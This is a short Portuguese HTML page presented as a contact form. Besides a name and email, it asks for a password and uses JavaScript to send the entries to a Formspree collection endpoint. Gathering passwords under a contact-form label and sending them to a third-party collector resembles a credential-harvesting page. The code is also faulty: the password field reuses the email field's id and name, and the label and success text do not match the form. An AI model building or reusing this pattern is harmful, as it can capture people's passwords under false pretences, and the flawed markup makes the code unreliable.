<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Formulário de Contato</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f4f4f4;
    }
    .container {
        width: 400px;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h2 {
        margin-top: 0;
        color: #333;
    }
    input, textarea {
        width: 100%;
        padding: 10px;
        margin-top: 8px;
        margin-bottom: 20px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
    }
    button {
        background-color: #4CAF50;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
    }
    button:hover {
        background-color: #45a049;
    }
</style>
</head>
<body>

<div class="container">
    <h2>Formulário de Contato</h2>

    <form
  action="https://formspree.io/f/mrgnrble"
  method="POST"
  id="contactForm"
>

        <label for="name">Nome:</label>
        <input type="text" id="name" name="name" required>

        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>

        <label for="message">Senha:</label>
        <input type="password" id="email" name="email" required>


        <button type="submit">Enviar</button>

</form>
<script>
    document.getElementById("contactForm").addEventListener("submit", function(event) {
        event.preventDefault();
        const form = event.target;
        const formData = new FormData(form);
        const url = "https://formspree.io/f/mgegrvyj"; // Substitua pelo URL do seu formulário no Formspree
        const method = "POST";

        fetch(url, {
            method: method,
            body: formData,
            headers: {
                "Accept": "application/json"
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error("Erro ao enviar o formulário.");
            }
            alert("Obrigado! Sua Casdatro foi enviada com sucesso.");
            form.reset();
        })
        .catch(error => {
            console.error("Erro:", error.message);
            alert("Ocorreu um erro ao enviar o formulário. Por favor, tente novamente mais tarde.");
        });
    });
</script>

</body>
</html>
